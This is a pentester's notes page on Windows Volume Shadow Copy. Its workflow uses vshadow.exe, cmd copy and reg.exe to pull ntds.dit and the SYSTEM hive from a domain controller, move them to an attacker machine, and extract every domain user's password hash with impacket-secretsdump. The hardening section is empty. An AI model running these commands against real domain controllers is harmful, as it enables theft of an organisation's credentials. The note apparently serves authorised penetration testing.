---
tags:
  - "#type/tech-specific"
  - "#attack/persistence"
  - "#attack/credential-access"
---
# Fundamentals

Backup technology from microsoft, also called "Volume Shadow Service (VSS)".

Can make backups of single files or whole volumes.

Microsoft Backup Tool: [VShadow](https://learn.microsoft.com/en-us/windows/win32/vss/vshadow-tool-and-sample)

# Pentesting

## Credential Access & Persistence

> [!Hint] Not quite stealthy
> This techniques is not quite stealthy - a local [[2 Tech-Specifics/Active Directory/Lateral Movement - AD/dcsync|dcsync]] is stealthier.

As a domain admin, you can make a backup of the Active Directory Database (`ntds.dit`) and extract password hashes of every domain user offline.

**Prerequisites:**
- Domain Admin Privileges
- Access to the domain controller

**Workflow:**
1. Extract the the ntds.dit:
	1. Create Backup of C Volume using [VShadow](https://learn.microsoft.com/en-us/windows/win32/vss/vshadow-tool-and-sample) : `vshadow.exe -nw -p C:`
	- A "shadow copy device" is created where the copy can be accessed. The output shows the device name
	2. Extract the the ntds.dit from the backup:
	- `copy <shadow_copy_device_name>\windows\ntds\ntds.dit c:\ntds.dit.bak`
		- **Note:** This only works with the [[cmd]] version of `copy`
2. Save the system hive of the domain controllers registry:
	- `reg.exe save hklm\system c:\system.bak`
3. exfiltrate the .bak files - e.g. to a kali machine
4. Extract credentials using [[3 Tools/network/impacket-scripts#Impacket-secretsdump|impacket-secretsdump]]

# Hardening
